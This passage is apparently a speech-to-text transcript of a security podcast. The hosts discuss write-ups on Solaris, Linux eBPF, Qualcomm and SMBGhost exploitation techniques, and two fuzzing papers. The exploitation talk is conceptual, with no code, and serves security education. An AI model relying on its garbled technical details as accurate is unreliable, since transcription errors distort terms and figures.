and I don't see how do you like this is twisting it and extreme amount to call it info disclosure\", \"start\": 6257.1}, {\"speaker\": 1, \"line\": \" it does kind of suck like I have lost a little bit of respect for VMware honestly like I've always liked VMware I've like their products but\", \"start\": 6274.3}, {\"speaker\": 3, \"line\": \" I mean the sad thing is they're still the best like virtualization product to use by far I mean like you know even hyper-v or yeah I was gonna say how I feel like virtualbox can't compete hyper-v it's less Polished by Far\", \"start\": 6282.9}, {\"speaker\": 1, \"line\": \" well, hyper-v is really good for Windows stuff. As soon as you start using it for Unix stuff it is it kind of it doesn't compete with VMware will put it that way. I've had massive performance issues on hyper-v when it comes to Unix stuff. I've heard it's good for Windows stuff, but Yeah, you know that Munich stuff is a big big part of you know, some of the work that I do so I don't use hyper-v. Well, we'll move on to Solaris. I honestly didn't even think that's is there anybody still using Solaris?\", \"start\": 6299.0}, {\"speaker\": 3, \"line\": \" Probably Legacy more or less. I'm so so I actually thought Solaris development. It stopped. I was mistaken on that there. It's not they haven't updated in three years, but they do still do occasional patches and stuff apparently. I'm saying apparently because I didn't dig deep I legitimately thought that the last release was like a final release. I didn't realize they were still doing some patches on it and that's there's been ownership things. Like it's past hands a bunch of times. Either way this bug is in the hoodoo or W or it's also in the W application. Yeah code base. I think if this this example here does not actually go through exploiting it. lately it just shows basically that there is a bug in the Heap and they talk a little all right there is a buffer overflow he based it in basically just meant it comes out of the PSN file structure ends up being populated out of prepared PS info I mean where else would you expect it to get the information from but what it ends up doing at some point later on is if I can find the code example is it'll do a concatenation in one of the strings where it basically just adds a bracket whatever your argument was and bracket that's if when it's filling in our arguments it basically just adds that in there if your argument actually start with like a - space or something so if you do that it depends that little bit string it doesn't account for that offense so if you have a large if you have a Mac sighs string again to that point you like your buffers already full you can overflow by maximum in this case like I think that'll fill up 15 bytes you can provide and there's that argument plus the two brackets no bite leading to they mentioned specifically 17 bites of overflow 17 bites is not large enough to reach other structures that actually kind of matter in there so you can't get the control you can't get Direct Control flow sorry you can get direct access to the control flow with this you can to overwrite anything that's like a critical control structure you can corrupt the P child and P sibling I think it is which you may then be able to leverage into an exploit they did not actually do that yeah but and so they do also Mexican some extra challenges they're like said like that that's the gist of the ex white it appends the string and it doesn't actually count for that in terms of the string size so it can overwrite easy enough to understand exporting this might be difficult it does mention it does starve with privilege bracketing it does you have the proc owner set on it it does drop that pretty quickly though so you have a very limited time to abuse that and your buffer is going to end with that bracket and know which may or may not actually impact what you can do Force you have to deal with ASL are still a lot of work to still be done but it's kind of you know it's an issue in a pretty significant binary\", \"start\": 6331.6}, {\"speaker\": 1, \"line\": \" I could see this potentially not being exploitable just because you have so many compounding issues on top of it\", \"start\": 6532.0}, {\"speaker\": 3, \"line\": \" I'm at the very least you're probably I need another Gadget. You're going to need something for a SLR.\", \"start\": 6538.9}, {\"speaker\": 1, \"line\": \" You need an input link.\", \"start\": 6544.1}, {\"speaker\": 3, \"line\": \" Yeah, you need something else here. I mean, maybe you could get maybe you could turn this overflow into read Gadget. I don't know. I don't know enough\", \"start\": 6545.3}, {\"speaker\": 1, \"line\": \" how you can hit his pointers like you're going to need to be able to set it out or you might be able to do a partial overwrite or something. But yeah, it would be hard to hit.\", \"start\": 6555.7}, {\"speaker\": 3, \"line\": \" Yeah, and they mention that but it is a heap issue. I mean if you want to play around with something I think this might be someone fun to do that with because it is we don't know if it's exploitable. It is something that he'll have to prove you can exploit up with.\", \"start\": 6565.6}, {\"speaker\": 1, \"line\": \" Yeah, so due to it not being proven to be able to give code execution and with the set of restrictions, they only rated at a 2.5 Steve ESS score. I don't know if I entirely agree with that score. It's still a memory corruption and it could be possible to get LPE. So 22.5 seems a bit low for me that might just be\", \"start\": 6580.1}, {\"speaker\": 2, \"line\": \" My opinion though.\", \"start\": 6600.6}, {\"speaker\": 3, \"line\": \" Yeah, but so what they did is basically they gave it CIA is so confidentiality and low Integrity non-availability none. You can't so I mean that makes sense CBS s doesn't always capture everything that's\", \"start\": 6601.4}, {\"speaker\": 1, \"line\": \" important. But whoa, wait availability none. This could still be used to das or well\", \"start\": 6617.5}, {\"speaker\": 3, \"line\": \" and I guess that's that's actually kinda well thing but like you'd only be self tossing that West coming in like you're not going to die\", \"start\": 6623.2}, {\"speaker\": 1, \"line\": \" somebody else. Yeah, that's good point. So yeah, maybe yeah,\", \"start\": 6632.0}, {\"speaker\": 3, \"line\": \" so I get it being low access or sorry the access Specter is also our local complexities high privilege required low user interaction required. Scope change so I yeah, no, I mean CBS s doesn't always captures like it doesn't capture the potential of an issue and their issues their other options besides CBS s CBS s pretty standard but there are other options that maybe try and capture the splash. The splash is own of the actual issue kind of how far it will reach and other kind of metrics that CB SS just doesn't capture. So now I think 2.5 is fair given the limited access of\", \"start\": 6636.8}, {\"speaker\": 1, \"line\": \" this okay but basically we're just going to use that to challenge anyone out there who wants to prove it wrong you know try maybe you can try to exploit it\", \"start\": 6677.9}, {\"speaker\": 3, \"line\": \" and yeah I'd be interested to see somebody actually exploit\", \"start\": 6687.4}, {\"speaker\": 1, \"line\": \" it would be a fun right up yeah so talk about write-ups we have yet another zdi post you know like you were saying another week another z i post this week's is about a privilege escalation found in the ebps subsystem of the Linux kernel which isn't super surprising EP F + B PF in general is pretty notorious for bugs for those who don't know e BP F stands for extended Berkeley packet filter and it essentially allows you to write filter programs which packets pass through it's like an emulator for a mini instruction set\", \"start\": 6690.4}, {\"speaker\": 3, \"line\": \" kind of yeah well it's like a VM to language like you know Java yeah type of BMI I mean I don't think it's it's not working like hotspot VM or anything but that's the idea you have these limited instructions that work inside of the BP F VM and\", \"start\": 6723.7}, {\"speaker\": 1, \"line\": \" of yeah so because it's like a VM it allows you to interact with registers move memory within your own buffer all that kind of stuff and because because of this it obviously needs verification on memory accesses and all that stuff to make sure it's actually in bounds and they use a verifier to do this and this verifier is not perfect and it's had issues in the past in this particular case the issue spawns from a discrepancy between 32-bit and 64-bit data so jump condition oils are used for the 32-bit variance and because of this additional checks need to be done because attackers can control the full 64 bits of the the registers and stuff like that so to do this they do a range check of value between a Min and a Max but if you have a minimum of 1 and a maximum of the max value for a 32-bit unsigned in plus 1 the range function just checks the lower 32 bits and it will see that they're both equal at just the one bit is set and because that's basically because the mask is only a 32-bit mask and due to this and assumption will be made that the lowest 32 bits of the offset will be marked to be known as just the 0 0 0 0 1 basically and this is a bad assumption because the minimum and the maximum are way further apart than the lower 32 bits would suggest and this is an issue because the full value is assumed based on only the lower 32 bits when it doesn't account for those upper 32 bits so you can basically break this assumption to to break further assumptions that isn't the whole story though you you break the static text that way you also need to worry about the runtime checks because in EBP F because of all the issues they added another stage called an ALU sanitation sanitation which basically tries to perform runtime checks on values as well so it does bounce checking if you use a value it'll check will this hit the minimum or the maximum and it'll check any arithmetic operation against the AL limit to make sure the value can be safely added or subtracted without exceeding that range but that also has issues while it seems to work fine for one arithmetic operation it doesn't work when multiple are chained together to the example they give is if you have like a 4,000 byte buffer of safe memory if you have two operations that at 2,500 each to the accessor that'll be five thousand which is obviously more than 4,000 it'll be out of bounds but both checks will pass because 2500 itself is within that 4,000 body limit so if you can chain them together you can get an out of bounds read write and then that ends up by passing The static check and the runtime check so by changing those two together they end up getting a pointer up to hex 6000 bites before the start of their safe buffers contents and something else that's important there is that memory is not stored in its own Heap chunk it's stored in a structure so that memory within the hexa six thousand bytes that they Out of bounds is completely deterministic. So that makes exploitation so much cleaner and nicer and they basically found another member in the structure that they could corrupt to easily get an arbitrary, right? And because you know that memory is so deterministic. They can also you know, they don't have to worry about ASL are they can defeat a SLR and then they just use that to smash the credential structure of the process to get uid 0 so You know, the exploitation of it is fairly straightforward the actual bugs. It's kind of fun because it sucks about you know, that discrepancy between 32-bit and 64-bit and all the math that goes into that. I do think they could have covered it a little bit better getting those details that I just said took a lot of like mental effort to try to understand what they were trying to say. I think a diagram or something would have been really helpful here, but overall the issue is really cool and hitting You think it kernel level especially when it's that complex and that subtle I guess is always fun to read about so we wanted to cover it.\", \"start\": 6738.7}, {\"speaker\": 3, \"line\": \" So yeah, I mean, I'd agree with you on the right up being a little bit little bit hard to follow and that I think is it's a guess right up also. I mean, it's it was you know, whoever man Fred Paul from Red Rocket CTF who did the right up there. So, I mean it's not necessarily reflective of how O zi always is. but um I mean it's still interesting to read though and yeah\", \"start\": 6986.6}, {\"speaker\": 1, \"line\": \" could be a fun exploit for anybody want to do Colonel exploitation one thing that is worth pointing out to is they say that it's commonly assumed that EPF cannot be accessed from unprivileged users which is smart because BPF you know it's a VM you typically don't want anybody to be able to use that because it is more likely to contain bugs it's a very valuable attack surface but it seems in a recent issue kernel version like I want to say like 4.5 they actually opened it up to be able to so you can bind a BPF filters to sockets so that assumption that it can't be accessed from unprivileged is not a valid assumption on like newer kernel versions so that was another kind of thing of interest that can be pulled out of the article too that being said I think we'll move on to even more Colonel vulnerabilities our last set of vulnerabilities and yet episode and that is in Qualcomm devices so this was a write-up buys Imperium and it was basically two issues one was a race condition the other was a use after free and they were both in like basically the same area there in the QC Comm device\", \"start\": 7018.3}, {\"speaker\": 3, \"line\": \" yeah same area I will mention that the race condition actually had as they say all sorts sorts of memory Corruptions depending on where exactly the race hits well it's just given the 1cv number there were there's the potential for a number of different exploits because of\", \"start\": 7090.7}, {\"speaker\": 1, \"line\": \" it not surprising it's one of those ones where race conditions are kind of funny because the the common way to defeat race conditions is using Mutual exclusion blocking and one thing that a lot of people don't really consider is all you need for a race condition to happen is to have one path that isn't locked a lock is only useful alif everyone who uses that resources use the locks so if one person access to that resource without using a lock then any other path can be raced and that's what makes it so that's what makes race conditions so hard to prevent is you only need one and then the assumption is broken everywhere so that's why racism so powerful and that's why in this particular case like you were saying there is multiple ways to hit it it's no surprise Um, so you know, basically I think it has to do with how they interact with trustzone. They basically have this, you know function that allows you to have a shared buffer between the kernel and Trust Zone which for people who don't know trust Zone. It's a trusted execution environment in the chain of trust. It is higher than Colonel. Technically. If you have Colonel access, you should not be able to mess with anything and trustzone. So it needs that kind of mechanism to be able to bridge to communicate with trust Zone and\", \"start\": 7108.0}, {\"speaker\": 3, \"line\": \" Yeah, I do want to jump in before you go too deep with this and just mention there's this principle in programming do not repeat yourself or dry. I guess it's don't repeat yourself not do not but I'll the dry principle don't repeat yourself. And I think that kind of had came into play with this issue a little bit part of this issue comes down to they're two different cases as Spectre was mentioning about this buffer that's used to communicate with trustzone. Basically your station will allocate this buffer ion buffer that you can use to communicate and there's the function here that's vulnerable is the qse cam update command buffer or the 64-bit version of it and that will basically go and it will translate pointers is effectively the idea turn the pointers take the buffer turn the pointers into something trustzone will understand and it handles two different cases in which the buffers need to be modified and two different eye off dolls end up reaching it in am calling it for two different handlings and that's where I think dry kind of came in here they tried to centralize what was more of an incidental repetition rather than actual repetition that needed to be prevented because winds where you can know this happens is when you start seeing a path where you know at first you have exactly the same code pretty much so hey I'm going to create a function that just you know takes argument and then you'll need to update this function whenever you want to change it and then when you see a flag being added you see something else being ad that will change that methodology that will change how it works that's when you know that you probably shouldn't have actually repeated that function when you start adding those flags that make significant changes it should be a secondary function rather than being just you know combining it so I just wanted to point that out with I feel like that dry idea like you do have to be aware of the idea of incidental repetition where the repetition is there but it's only incidental to what's going on and it's not actually something you should combine into one\", \"start\": 7190.0}, {\"speaker\": 1, \"line\": \" function Yeah, one of those things that contributes to this issue is this code would be fine in userland because basically what you were saying with the two different types, they track it through this you'll see it on if anybody watching you'll see it on the screen they say data type. So they have this data structure that stores the type. The problem is that that data structure is attached to the file descriptor is attached to the device. So, you know, if you have two different octaves that can change the type from underneath the other thread that's Where the race condition comes into play now if this code was sitting in userland this code would probably be fine. The issue comes in where in Colonel it's very easy to have concurrent access and that's where a lot of Kernel driver issues bond from the fact that it's people who aren't familiar with the pitfalls that come with working in Colonel. They can be fair sitter that there's going to be concurrent access. There\", \"start\": 7316.8}, {\"speaker\": 3, \"line\": \" is mitigation. Actually they do they do have some level of mitigation. I believe against the concurrent access it just wasn't evident here just not good enough yeah as you are saying though just one route and I will save this where two different functions though you wouldn't be able to like the changing of the data type what a matter that's where I was getting at it from was you know by not rip the whole dry principle and up kind of backfiring here because they have the one function doing two things I guess that always comes down to separation of concerns but if this were two functions even if that change therefore the function shouldn't have been even looking for that data type later on it's kind of what I was getting\", \"start\": 7371.9}, {\"speaker\": 1, \"line\": \" at Yeah, so depending on what you hit they say this can be used to hit naldi references or buffer overflows. The book The buffer overflows are obviously more interesting for exploitation nullity references is it's basically a useless bug nowadays, but the other one was a use after free and this one I think was a little bit more interesting of above just because it's a way\", \"start\": 7411.7}, {\"speaker\": 3, \"line\": \" for people to hit just before you switch. I do just want to kind of clarify the last bug at Specter kind of mention if you can change at the data type. So as I was saying here where this function will change or it will check the data data type to decide what to do. So you can have a function that will start with one data type called cause the other eye off to be called changes that data type and it'll end doing the other functionality. I just want to kind of clarify that point just make it explicit what the bug was you can go onto the uaf\", \"start\": 7434.8}, {\"speaker\": 1, \"line\": \" okay yeah that's fair so in another function which is also called from the same I octal Handler is QC comset client member am and this can be used to set the request length now obviously this is bounced check that's not a super obvious you know issue like that it's not a low-hanging fruit issue so if it's too large it will bail within Val which is a common error code for stuff like that the problem is it resets the handle but because the the check fails no other parameters are modified and they're not wiped out so it will end up pointing to a previously set ion buffer which is already been freed so it's a classic use after free after a lot of digging I was able to find the patch it probably took me like 20 minutes just to find the patch but I will bring it up just because it does kind of clarify what the issue is if you're not familiar with the code base I've just brought it up here basically all they did to fix this issue was on error they basically just memset the entire structure to 0 so as soon as you go to use the next you know the next iteration of that driver I guess is a good way of saying it it won't be able to access that stale data on the fail so you know it's just a it's a it's a classic use after free very straightforward\", \"start\": 7470.2}, {\"speaker\": 3, \"line\": \" fix yeah I mean it felt like there was a little bit of extra work that needs to be done I mean nothing too difficult but because it would know that would know the I handle and then another here called the set climb Emperor am that would end up setting the I handle again and then it would yeah be able to use those things that little bit of extra work from just a straightforward uaf I know how much you basically get that I handle reset so then other things will start using it again because everything was checking I handle\", \"start\": 7551.1}, {\"speaker\": 1, \"line\": \" yeah so you know good old Qualcomm while I was looking into this by ready just just to harp on it again I've talked about it before but I'll talk about it again this issue absolutely still exists in certain you know Android versions because of how fragmented the Android code base is I ended up finding I think like zo me or whatever however you say that I think they're codebase still isn't resilient to this issue they haven't included the patch so you know you can see on the timeline here the security bulletins was published and sung put in fixes and Google put in pixie's so on the pixel and the galaxies is probably fixed but on a lot of other phones this is probably still a zero day if they're using a Qualcomm chip so just be aware that that you know this is not fixed on all devices because of how stupidly fragmented the Android Community is terms of trying to get fixes Downstream it's a nightmare which\", \"start\": 7584.7}, {\"speaker\": 3, \"line\": \" is definitely something we've discussed before\", \"start\": 7642.6}, {\"speaker\": 1, \"line\": \" yeah yeah for sure now I kind of lied earlier I said that was the last wait but I totally forgot that we move this one up so we got a blog post another kind of follow-up to the SMB ghost vulnerability so we covered the SMB goes vulnerability a few weeks ago but it was only as an LP e it was said that in rce remote code execution was possible but we hadn't seen anything actually demonstrating that the one that we covered a few weeks ago was able to get code execution but they needed to use a local info geek Vector So for anybody that wants to\", \"start\": 7645.6}, {\"speaker\": 3, \"line\": \" look look that off that was episode 36 when we talk about it\", \"start\": 7679.3}, {\"speaker\": 1, \"line\": \" yeah okay good yeah the yeah it's good to point out the episode number I couldn't remember the exact number so you know you need the read primitive to know where to write to because essentially the SMB ghost vulnerability the way they hit it it gave you an out of bounds memory corruption on the Heap through an integer overflow in the decompressed function and you can use that to get an arbitrary kernel right I'm not going to talk about that issue too much just because we already covered that in depth on episodes we talked to it episode 36 but what's important to note there is you can also hit other adjacent data with the memory corruption as well and one thing you can hit for example is like peanut raw buffer or some other member that gets copied to a response because your corruption is in the request packet so to other members contained in the same header are Pointers to mdl structures and mdl for those who don't know it stands for a memory descriptor list and what's important what's important about those is is they contain physical memory pointers so you know when you're talking about kernel-level you have two different types of memory you have virtual memory and physical memory so virtual memory gets mapped to physical memory and it's a lot easier to work with physical memory is the actual the real address if you want to call it that that contains the the data and what's important about that is physical memory is harder to randomize then virtual memory virtual memory with a slrs like that it's a lot easier to deal with and that actually comes into play here there's a reason they went with that ndl method so they fake these mbl's and they K user shared data because they're they're mapped to fix locations and both user land and Colonel so you don't have to deal with a SLR they're mapped in fixed locations so they talk about some of the walls they hit with while doing this and I won't cover all that hear those who are interested are free to look at the right up but suffice it to say they basically get arbitrary physical memory read through that that mdl method now I'm not experienced some windows but apparently hitting the page tables is a common exploit strategy and windows kernel exploitation which kind of makes sense page tables are are pretty powerful to mess with so because of that Microsoft tries randomizing the address of the PML for or page map level for self reference entry and they do that by randomizing the index the problem is that happens at the virtual memory level that doesn't happen at the physical memory level so while the wall the index is randomized the physical address of that entry is not randomized and that's why I was saying you know physical memory can be really powerful to hit at the kernel level if you can do it so it seems bios always had it at a hex one a a000 and UEFI always had it at x 1 AD 0 0 0 so now they can I can basically get arbitrary read write and what they ended up hitting was the hardware abstraction layer how they essentially searched the physical backing memory of the house Heap to find the interrupt controller and smash one of the function pointers for the interrupt controller there are some other challenges even after code execution specifically they highlighted they tried launching a user mode process but they had some struggles with that because Windows user land uses control flow guard CFG but you know I don't want to go into that too too much just because this is a pretty dense right up and I will say you you will probably need some in-depth Windows knowledge to be able to fully appreciate it to fully understand it that's why you know I don't want to go too much into those issues partially because I don't have a strong background in Windows and I don't think he does either so we can't go too much into exactly how all that works I don't want to say like things that are like over the incorrect or anything like that at overall though I thought it was cool right up it's fun to see how an LP e can be turned remote using clever tricks like abusing physical memory like that I don't know if you have any other thoughts on that see\", \"start\": 7683.8}, {\"speaker\": 3, \"line\": \" yeah well I mean we always kind Neil was going to be an RC like that there was some way of getting that that's what it was originally reported as the lp was clearly just because they had the right what can they and this is what we talked about in episode 36 like they did LP because they had the right and they had an easy factor to turn that into an LP by grabbing the token or whatever I forget what they did in that one but they had that method so in this case like we just see a you know your workout you go from that are bright you get here read Gadget and keep moving from there just expanding on that it was a good write-up you drop this in like super last minute so I can't have much to say in depth on\", \"start\": 7931.3}, {\"speaker\": 1, \"line\": \" it well we had it as a shout-out originally but somebody from the re server want me to try to cover it more in depth so that's where I tried to get you know I wanted to read it more in depth so that's that's what happened there I will say though the actual issue that led to the arbitrary right if you're interested in that the post that we covered a few weeks ago does a way better job I think it has like really nice diagrams and it makes it a lot more accessible I don't think this one covered the the bug as well as the other post that being said this one I'm not saying like this one has a lot to offer that method of hitting it remotely it's very interesting and obviously isn't going to be included in the LPE version but just the bug details you might want to check out that other post but overall yeah I think the I think this was a really cool post and it finally demonstrated that it can be hit remotely like Ms were saying\", \"start\": 7974.5}, {\"speaker\": 3, \"line\": \" yeah and actually I will just add the link into the description for the other right up also just in case anybody wants it it would be down in the description\", \"start\": 8028.6}, {\"speaker\": 1, \"line\": \" here okay cool so this time I'm not lying that is our last exploit that we're going to cover you know in depth we will move on to some of our research stuff so our research stuff this week is focused on fuzzing our first one is called I John which is exploring deep State spaces with fuzzing deep State I don't think they mean like you know the intelligence community's\", \"start\": 8037.1}, {\"speaker\": 3, \"line\": \" they might but I mean they they're exploring Mario and this case Super Mario Bros one so I mean you never know how The Illuminati's using that\", \"start\": 8062.7}, {\"speaker\": 1, \"line\": \" you never know so I John is I think it's basically supposed to be like an annotation mechanism that allows humans to guide father's through problems of block a lot of modern fuzzers yeah so that's its own it's not really a fuzzer but it's something that interfaces\", \"start\": 8071.7}, {\"speaker\": 3, \"line\": \" with well so it's built on AFL so uses AFL kind of modern fuzzing what they kind of noted here is modern fuzzing you know they look the XY kind neighborhoods of test cases you give it a test case it mutates a test case into something else roughly related to it but there are tons of cases that are just the probability of triggering are randomly is just super small very limited if it's not actually kind of looking for that so what they've introduced here is the idea of being able to do some annotation so it's mixing kind of that code coverage guiding with limited value guided coverage for trying to hit all the different values for something and they provide kind of a good example of kind of the Curren there I think it's either in this or it's in their demo release I don't see it here so much been the other thing so what they kind of use as an example there's getting code coverage on some sort of maze application where all the application does is it basically just has a switch on if you had wasd or you know up down left right it one of those characters it adjusts a single value the xry up or down and that's all it really does so by adding an annotation they're just saying like hey also do we value guided coverage on the X and Y values because getting code coverage you could hit those for code paths up down left right super easily you're going to get a complete code coverage there but you also want to get that coverage of those are all the possible X and Y values which is kind of where they come in adding annotations for that and so by adding an annotation thing like hey these values are also important fuzz those they found they were able to get they use Mario's the example they're able to get much deeper into it into in this case the like said they use Mario trying to be the different levels there if you get much deeper in there and actually complete most levels\", \"start\": 8086.7}, {\"speaker\": 1, \"line\": \" yeah so if you want to see some of the implementation stuff of like some of the helper functions they provide if you go to page 8 I think you had it up briefly they had like a listing of some of the functions you have so they have like I John comp I John hash in tashman hashtag all that kind of stuff and what you were saying with like testing on Mario they also had a table on the 10th page I want to say yeah the 10th page and they have like this little table comparing AFL well on its own along with I John in the AFL and all the Mario levels that could solve so like you could see AFL it only hit a hundred percent of the distance on a few of the levels where I jotted hit on all of the levels basic or\", \"start\": 8211.2}, {\"speaker\": 3, \"line\": \" not most of all levels is that said like I'll mention a I mean yes Super Mario Bros does seem like a bit of a weird yeah but I so doing a ion games isn't that weird though so I don't know I mean it is a little bit of fuzzing like it's definitely a weird Benchmark it's not unheard of though because he do cut you have a goal you have a very particular score like you have some that can prove it's doing that and it's just kind of a test test case of see it's getting deeper into it it's able to get that depth because we tell it to focus on this these particular types of\", \"start\": 8252.3}, {\"speaker\": 1, \"line\": \" values it's a lot easier to visualize to like yeah program coverage is a lot harder to visualize for somebody who's not familiar with the contents of the paper\", \"start\": 8294.5}, {\"speaker\": 3, \"line\": \" well it's also it's also like the between just code coverage which is just you know the control handle or hit all the buttons and you've got it all the code coverage versus kind of all the different areas also like it's it illustrates the difference between what it's fuzzing\", \"start\": 8303.2}, {\"speaker\": 1, \"line\": \" for yeah so I did want to cover some of the observations they made before they got into their implementation details which we just covered I think it I think there's some useful observations there so one thing they found was code coverage is sometimes overestimated and what it provides just because it'll keep hitting irrelevant State changes and that's why they say like a human who can identify and guide those State changes might be more useful which is why they provide those those helper functions and stuff another thing they found was it might not be obvious to a father what can actually influence the state and and to what degree and the last thing was sometimes you don't even have good State information to work with so one example they give is like magic bites for that AFL doesn't really know how to handle those so all of these things the paper authors are you could be improved by you know including an actual person in that equation so I like the idea I do have some questions though like you were saying earlier while Super Mario is fun I don't think it should really be used as a serious Benchmark I'd want to see how this performs and works on larger complex code bases they you know they kind of they say they tested it against a test hashmap implementation and amaze and Super Mario if they're going to be fuzzing things I want to see how it actually works in the real\", \"start\": 8319.4}, {\"speaker\": 3, \"line\": \" yeah I know they're out there all very toy\", \"start\": 8399.1}, {\"speaker\": 1, \"line\": \" evaluations yeah exactly the other thing is this seems too for one thing this wouldn't work for Black Box fuzzing because you need to insert these helper functions in the source code so Black Box fucking is out of the question with this\", \"start\": 8401.6}, {\"speaker\": 3, \"line\": \" paper I don't know maybe you can instrument them in there may I don't know if you can't that's that's purely speculation is if you can instrument them you know find a concave get that code in there and then instrument the calls out from there I met there's the possibility you could do that but yeah I mean right now you do have to compile it in there\", \"start\": 8416.8}, {\"speaker\": 1, \"line\": \" they're generally speaking you need a white box fuzzing approach and on top of that this requires quite a a bit of like human intervention right like you have to have the human looking at the state changes knowing when to wear to put in those functions they have to edit and recompile the source code every time they want to make a change this requires a lot of human effort and one of the big Boons of fuzzing is to try to move away from doing that you know you just let the fuzzer run while you do other stuff maybe you co dot it while you have the fuzzer running and you just kind of leave it sit there\", \"start\": 8434.8}, {\"speaker\": 3, \"line\": \" and because you do need a crate the test cases the test Corpus or the fuzzer so that this requires even more effort on top of that well yeah I was going to say that though you can kind of relate to that I feel like this is more were hybrid fuzzing would come in rather than annotations using like the constraint solving to find those other paths that it's not not being able to hit I feel like I feel like there's maybe something to doing the annotations for what's of Interest maybe in another way like I think there's something to the idea there for sure\", \"start\": 8466.8}, {\"speaker\": 1, \"line\": \" yeah I like the idea I'm just I just question how much it's actually going to be like people are going to want to use it you know what I mean\", \"start\": 8503.4}, {\"speaker\": 3, \"line\": \" all right I guess we'll see I kind of I question it to like I don't think it's going to be the next big thing I feel like that's kind of going towards more hybrid fuzzing\", \"start\": 8511.5}, {\"speaker\": 1, \"line\": \" yeah there was one quote though I really wanted to point out in the papers I thought it was kind of a cool quote it said computers are incredibly fast accurate and stupid humans are incredibly slow inaccurate but brilliant so that's why they're kind of marrying the idea of bringing the two together to try to find more\", \"start\": 8523.5}, {\"speaker\": 3, \"line\": \" issues yes and no like I do think like the annotations and a person who actually takes the time to do that because that's a big thing when it comes to fuzzing like if you take the time to get the right the perfect Corpus for testing with it usually pays off a lot when you actually put the human in there to get some of that worked on versus just automation there's definitely work being done to try and automate a lot of them but the human intelligence aspect of it I think is still important at least right now like it still plays a big part\", \"start\": 8543.2}, {\"speaker\": 1, \"line\": \" I do like I do think whoever gets stuck in that job though of just writing the stuff and maintaining the father would probably suck like I don't know if I want that as a job it does seem kind of like dry work well it's\", \"start\": 8577.1}, {\"speaker\": 3, \"line\": \" probably wouldn't just be you know a person who that's their only job I feel like that would just be like you do that as part of your initial setup ramping up on a project he do some of that to decide where you want the fuzzer to focus on set up some annotations or whatever and then otherwise it's more or less as normal it's you know part of that initial research phase and just getting up to speed on a new project\", \"start\": 8589.0}, {\"speaker\": 1, \"line\": \" our last topic before shed its is another fuzzing paper it's a Pangolin which is incremental hybrid fuzzing with polyhedral path abstraction It's About Soul yeah so revisiting something we've talked about before hybrid fuzzing so just because it's been a little while since we talked about it hybrid fuzzing is basically the idea of combining live fuzzing with symbolic execution to try to get better State tracking and overall\", \"start\": 8613.8}, {\"speaker\": 3, \"line\": \" coverage so not just that but can kolak execution is kind of important of concrete and symbolic execution I mean you did kind of say that with the live running but they take the live running they take kind of the register values again to functions they take on all that live data and then apply that into some contrary solving and using some symbolic execution on that concrete data that you've already gotten to help determine new seeds to determine new mutations and using that constraint solving to find ways into New\", \"start\": 8637.2}, {\"speaker\": 1, \"line\": \" Paths yeah so they note that existing hybrid father's can often get like super high overhead and lose efficiency we've covered some of the issues with hybrid buzzing before partially you know it can be hard to integrate with certain code bases because of you know the challenges that come with it but the problem that they point out is that the father is not able to keep track of the state when going deep into nested paths so you end up with the state not really being preserved when it could be useful so you get you end up with like these redundant recalculations of the state is how I read it and I think the part of the reason they do that is maybe to prevent State explosion on the like colic execution side of things but I'm not ya know\", \"start\": 8670.3}, {\"speaker\": 3, \"line\": \" that that's pretty much exactly why is State explosions kind of the big issue yeah\", \"start\": 8714.9}, {\"speaker\": 1, \"line\": \" so that's where the incremental part comes in the heart of their tool is to try to fix that problem it does get pretty mathy because they talk about their own term which is in the the title polyhedral path abstraction but I think it's basically used to try to help out and guide the smt constraint solving and try to guide the mutation for code coverage but it is you know when you're getting into constraint solving and stuff like that you can see like there's these equations with symbols that most people probably don't even know exist\", \"start\": 8720.6}, {\"speaker\": 3, \"line\": \" I mean if you've done like a intro computer science when you should get two Street math or discrete mathematics in there so you should be familiar with the logic symbols that said it is great mathematics well I don't think he did a CS the curry either no I didn't I'm basically saying if you have a degree it should be familiar which isn't a good level to be using that said I mean this is I would have more academic conference this paper was accepted to secured the IEEE security and privacy all friends 2020\", \"start\": 8749.9}, {\"speaker\": 1, \"line\": \" yeah so we can't cover too much of how that actual path abstraction and stuff works but you know for those who are interested in the math behind that it is there the link will be in description but overall it seems to be trying to solve a problem that has been plaguing hybrid fuzzing so it seems to be trying to do something novel so even though we can't cover it too in depth we did at least want to mention it in the podcast yeah it's like at\", \"start\": 8784.5}, {\"speaker\": 3, \"line\": \" least\", \"start\": 8813.8}, {\"speaker\": 1, \"line\": \" on the\", \"start\": 8814.4}, {\"speaker\": 3, \"line\": \" see I figured at least we could cover the gist of it here being that it is trying to kind of solve that keeping some history being able to kind of guide the mutation a bit through that history and guide something constraint solving like I said show myself something issues there it is a take on it unfortunately it was a little bit dense for us to kind of be able to give you guys the full details there but you know it's it's kind of Leading Edge of where some of that research is right now\", \"start\": 8814.5}, {\"speaker\": 1, \"line\": \" but it's basically the idea of using past information to predict future information that's like the whole I think\", \"start\": 8843.0}, {\"speaker\": 3, \"line\": \" this event I go with yeah yeah well that the path abstraction interface Sky their new novel area is kind of a using abstracting the paths that's saying through their way so that it doesn't even know like the whole thing it's a trip well it's abstracted away that said I think just rambling with that\", \"start\": 8850.1}, {\"speaker\": 1, \"line\": \" yeah so we'll move on to some shoutouts those EU had a shout out with more fussing stuff\", \"start\": 8871.6}, {\"speaker\": 3, \"line\": \" yeah well so when I first saw the paper and I will mention I forgot to mention when we gone I John that actually came that was mentioned by exp why on our Discord he's who first time link that out so I did want to give a shout out there sorry I forgot to do with that paper but when I was doing that I tried to find a good source for the paper figure out like how old it was and things like like that before I decide if we'd cover it or not and I came across this really cool GitHub which is literally just fuzzing paper and all this is a collection of recent fuzzing papers it's getting updated so I just wanted to kind of share that you know if you're interested in the fuzzing of research seems to have a good collection of them paying attention to what's coming out it's also just a good collection of fussing papers I also want to just put a question out to the community and just ask me aware of a similar repository for exploit development either just exploit mitigations or development or both or something along that because if that's not being done I think that would be interesting maybe start doing\", \"start\": 8877.1}, {\"speaker\": 1, \"line\": \" also there is one for Colonel\", \"start\": 8944.1}, {\"speaker\": 3, \"line\": \" stuff I've seen Colonel stuff I've seen window stuff I'm not sure if I've seen anything that's really\", \"start\": 8947.5}, {\"speaker\": 1, \"line\": \" just like more\", \"start\": 8952.1}, {\"speaker\": 3, \"line\": \" generic yeah yeah so know if anybody's a wire definitely let us know either comments or hit us up on on this board whatever\", \"start\": 8953.7}, {\"speaker\": 1, \"line\": \" yeah for sure or you can just yeah you can do you can tweet it as well that being said I think that summarizes all the topics I will reread iterate again that I will be doing a stream tomorrow night looking at the you know binary ninja decompiler seeing how it Compares and looking at some of the common you know nitpicks and stuff that I've seen around it trying to see how much validity there is to them and if they can be worked around so that stream will be on probably around 8 